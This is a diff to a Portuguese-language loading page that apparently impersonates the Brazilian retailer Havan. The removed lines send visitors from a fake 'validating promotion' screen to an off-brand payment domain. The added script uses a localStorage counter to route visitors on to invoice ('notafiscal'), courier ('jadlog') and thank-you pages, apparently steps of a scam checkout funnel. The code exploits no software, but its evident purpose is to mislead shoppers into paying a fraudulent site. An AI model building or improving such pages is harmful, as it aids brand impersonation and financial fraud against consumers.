@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HAVAN - Validando Promoção</title>
+    <title>HAVAN</title>
     <style>
         body {
             display: flex;
@@ -37,14 +37,25 @@
             color: #0054a6; /* Azul da Havan */
         }
     </style>
-    <meta http-equiv="refresh" content="0; URL='https://pay.checkoutseguro.club/zj6aGn07b8W3wlK'">
 </head>
 <body>
     <div class="spinner"></div>
-    <p>Validando promoção...</p>
+    <p>Aguarde...</p>
 
     <script>
-        localStorage.setItem('up', 1);
+        // Lê o valor da chave 'up' do LocalStorage
+        const up = localStorage.getItem('up');
+
+        // Redireciona com base no valor de 'up'
+        if (up === '1') {
+            window.location.href = '/notafiscal';
+        } else if (up === '2') {
+            window.location.href = '/jadlog';
+        } else if (up === '3') {
+            window.location.href = '/obrigado';
+        } else {
+            window.location.href = '/notafiscal'; // Valor padrão caso 'up' não exista
+        }
     </script>
 </body>
 </html>
